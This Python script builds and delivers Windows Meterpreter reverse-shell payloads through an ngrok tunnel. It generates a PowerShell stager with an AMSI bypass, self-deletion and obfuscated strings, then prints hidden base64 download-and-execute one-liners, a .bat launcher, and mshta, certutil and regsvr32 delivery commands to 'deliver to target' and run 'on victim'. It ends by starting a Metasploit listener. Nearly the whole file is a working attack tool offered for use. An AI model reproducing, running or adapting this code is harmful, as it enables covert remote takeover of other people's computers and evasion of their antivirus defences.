import subprocess
import time
import re
import os
import base64
import http.server
import socketserver
import threading

# === CONFIG ===
LPORT = "4444"
PAYLOAD_OPTIONS = {
    "1": "windows/meterpreter/reverse_tcp",
    "2": "windows/meterpreter/reverse_https",
    "3": "windows/meterpreter/reverse_http"
}
NGROK_PATH = "/usr/local/bin/ngrok"
HTTP_PORT = 8000
SCRIPT_NAME = "payload.ps1"
HANDLER_FILE = "msf_handler.rc"

# === USER CHOICE ===
print("Select Payload Type:")
print("1) reverse_tcp")
print("2) reverse_https (stealthier)")
print("3) reverse_http")
choice = input("Enter choice (1/2/3): ").strip()
PAYLOAD = PAYLOAD_OPTIONS.get(choice, "windows/meterpreter/reverse_https")
print(f"[+] Payload selected: {PAYLOAD}")

# === START NGROK ===
print("[*] Starting Ngrok tunnel...")
ngrok_proc = subprocess.Popen([NGROK_PATH, "http", str(HTTP_PORT)], stdout=subprocess.DEVNULL)
time.sleep(5)

# === FETCH NGROK ADDRESS ===
print("[*] Fetching Ngrok endpoint...")
try:
    tunnel_info = subprocess.check_output(["curl", "-s", "http://127.0.0.1:4040/api/tunnels"])
    match = re.search(r'"public_url":"(https://.+?)"', tunnel_info.decode())
    if not match:
        raise Exception("Could not parse Ngrok HTTP URL")
    ngrok_url = match.group(1)
    print(f"[+] Ngrok Forwarding: {ngrok_url}")
except Exception as e:
    print("[-] Error getting Ngrok URL:", e)
    ngrok_proc.terminate()
    exit(1)

# === GENERATE MSF PAYLOAD SCRIPT ===
print("[*] Creating stealth PowerShell payload...")
payload_cmd = subprocess.run([
    "msfvenom",
    "-p", PAYLOAD,
    f"LHOST={ngrok_url.replace('https://', '')}",
    f"LPORT={LPORT}",
    "-f", "psh"
], capture_output=True, text=True)

if payload_cmd.returncode != 0:
    print("[-] msfvenom failed:", payload_cmd.stderr)
    ngrok_proc.terminate()
    exit(1)

cmd = payload_cmd.stdout.strip().replace("\"", "`\"")

# === STEALTH TECH: AMSI Bypass, Self-delete, Obfuscated strings ===
stealth_shell = f"""
$e='System.Ma'+'nagement.Automation.AmsiUtils';$t=[Ref].Assembly.GetType($e);$f=$t.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true);
$path=$MyInvocation.MyCommand.Path;Start-Sleep -s 1;Remove-Item $path -Force;
{cmd}
"""

# Save payload.ps1
with open(SCRIPT_NAME, "w") as f:
    f.write(stealth_shell)

print(f"[+] Saved stealth PowerShell payload as: {SCRIPT_NAME}")

# === STEP 2: LAUNCH HTTP SERVER ===
def start_http():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_http, daemon=True).start()
time.sleep(2)

# === STEP 3: CREATE BASE64 ENCODED PAYLOAD WITH ENV + LOLBins ===
print("[*] Building base64 payload using LOLBins...")

# Step 1: PowerShell download string
ps = f"IEX (New-Object Net.WebClient).DownloadString('{ngrok_url}/{SCRIPT_NAME}')"
b64 = base64.b64encode(ps.encode('utf-16le')).decode()

# Step 2: One-liner using PowerShell encoded
powershell_cmd = f"powershell -nop -w hidden -enc {b64}"

# Step 3: ENV trick payload
env_trick = f"""
set PAYLOAD={powershell_cmd}
call %PAYLOAD%
"""

# Save to .bat launcher
with open("payload_launcher.bat", "w") as f:
    f.write(env_trick)

# LOLBin delivery examples
lolbins = {
    "mshta": f'mshta.exe "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Run(\'{powershell_cmd}\');close()"',
    "certutil": f'certutil -urlcache -split -f {ngrok_url}/{SCRIPT_NAME} payload.ps1 && powershell -ExecutionPolicy Bypass -File payload.ps1',
    "regsvr32": f'regsvr32 /s /n /u /i:{ngrok_url}/{SCRIPT_NAME} scrobj.dll'
}

# === STEP 4: CREATE MSFCONSOLE HANDLER ===
with open(HANDLER_FILE, "w") as f:
    f.write(f"""
use exploit/multi/handler
set PAYLOAD {PAYLOAD}
set LHOST 0.0.0.0
set LPORT {LPORT}
set ExitOnSession false
exploit -j
""")

# === FINAL OUTPUT ===
print("\n🎯 STEALTH PAYLOADS READY — DELIVER ONE OF THESE TO TARGET:")
print("=" * 70)
print(f"[🔥 ENV Trick] Save and run payload_launcher.bat on victim")
print(f"[🔥 Direct PowerShell] {powershell_cmd}")
print(f"[🔥 mshta (LOLBIN)] {lolbins['mshta']}")
print(f"[🔥 certutil] {lolbins['certutil']}")
print(f"[🔥 regsvr32] {lolbins['regsvr32']}")
print("=" * 70)
print(f"[+] Hosted script at: {ngrok_url}/{SCRIPT_NAME}")

# === STEP 5: LAUNCH METASPLOIT LISTENER ===
try:
    subprocess.run(["msfconsole", "-r", HANDLER_FILE])
except KeyboardInterrupt:
    print("\n[!] Ctrl+C detected. Cleaning up...")
finally:
    ngrok_proc.terminate()
    os.remove(HANDLER_FILE)
